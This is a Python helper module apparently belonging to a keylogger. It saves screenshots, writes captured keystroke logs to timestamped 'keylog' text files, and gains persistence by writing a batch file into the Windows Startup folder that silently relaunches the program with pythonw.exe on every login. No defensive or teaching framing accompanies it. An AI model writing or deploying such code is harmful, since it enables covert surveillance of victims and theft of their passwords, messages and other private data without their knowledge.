import os
from datetime import datetime
from pathlib import Path

import pyautogui


def get_current_path():
    return os.getcwd().replace('\\', '/')


def take_screenshot(self):
    myScreenshot = pyautogui.screenshot()
    update_png_filename(self)
    print("saving -> {}".format(self.png_filename))
    screenshot = "{}/{}".format(self.screenshot_path, self.png_filename)
    self.files.append(screenshot)
    myScreenshot.save(screenshot)


def update_txt_filename(self):
    start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
    end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
    self.txt_filename = f"keylog-{start_dt_str}_{end_dt_str}"


def update_png_filename(self):
    dt_str = str(datetime.now()).replace(" ", "-").replace(":", "")
    self.png_filename = f"screenshot-{dt_str}.png"


def report_to_file(self):
    file_to_save = "{}/{}".format(self.log_path, self.txt_filename)
    with open(f"{file_to_save}.txt", "w") as f:
        print(self.log, file=f)
    print(f"[+] Saved {self.txt_filename}.txt")


def mkdir(folder):
    if not os.path.exists(folder):
        os.makedirs(folder)


def create_bat_file(report_method):
    current_folder = os.getcwd().replace('\\','/')
    bat_file = 'start /b pythonw.exe "{}\main.py" {}'.format(current_folder.replace("/","\\"),report_method)
    home = str(Path.home()).replace("\\","/")
    startup_folder = "{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup".format(home) 
    with open(f"{startup_folder}/open.bat", "w") as f:
        print(bat_file, file=f)
